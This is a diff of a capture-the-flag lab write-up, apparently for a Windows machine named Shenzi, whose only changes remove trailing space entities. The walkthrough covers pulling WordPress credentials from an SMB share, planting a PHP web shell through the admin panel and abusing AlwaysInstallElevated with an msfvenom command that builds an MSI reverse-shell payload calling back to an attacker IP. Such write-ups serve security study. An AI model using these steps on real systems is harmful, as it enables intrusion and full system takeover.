@@ -28,7 +28,7 @@ PORT      STATE SERVICE
 49669/tcp open  unknown
 ```
 
-Lots of ports here. FTP doesn't allow for anonymous access.&#x20;
+Lots of ports here. FTP doesn't allow for anonymous access.
 
 ### SMB Access -> WP Creds
 
@@ -59,7 +59,7 @@ smb: \> ls
   xampp-control.ini                   A      178  Thu May 28 23:45:09 2020
 ```
 
-`passwords.txt` contained some credentials to a Wordpress instance, while the rest of the files were rather uninteresting:&#x20;
+`passwords.txt` contained some credentials to a Wordpress instance, while the rest of the files were rather uninteresting:
 
 ```
 $ cat passwords.txt
@@ -106,17 +106,17 @@ Port 80 shows the default XAMPP page:
 
 <figure><img src="../../../.gitbook/assets/image (1091).png" alt=""><figcaption></figcaption></figure>
 
-There was a PHPInfo page that we could view for more clues.&#x20;
+There was a PHPInfo page that we could view for more clues.
 
 <figure><img src="../../../.gitbook/assets/image (1612).png" alt=""><figcaption></figcaption></figure>
 
-The only interesting thing to note is that the user is named `shenzi` on the machine. We need to be finding this wordpress instance. However, all directory scans failed to find any instance of `wp-content` or `wp-admin`.&#x20;
+The only interesting thing to note is that the user is named `shenzi` on the machine. We need to be finding this wordpress instance. However, all directory scans failed to find any instance of `wp-content` or `wp-admin`.
 
 I was stuck here for a while, until I visited `/shenzi` to test, and it worked!
 
 <figure><img src="../../../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>
 
-With this, we can easily login to the admin panel and replace one of the PHP files with a web shell.&#x20;
+With this, we can easily login to the admin panel and replace one of the PHP files with a web shell.
 
 <figure><img src="../../../.gitbook/assets/image (2725).png" alt=""><figcaption></figcaption></figure>
 
@@ -132,7 +132,7 @@ I ran `winPEAS.exe` to enumerate the machine for me. It picked up on AlwaysInsta
 
 <figure><img src="../../../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>
 
-Using this, we can generate an MSI payload using `msfvenom` and run it on the system, which would give us a reverse shell as the SYSTEM user.&#x20;
+Using this, we can generate an MSI payload using `msfvenom` and run it on the system, which would give us a reverse shell as the SYSTEM user.
 
 ```
 $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.191 LPORT=21 -f msi -o shell.msi
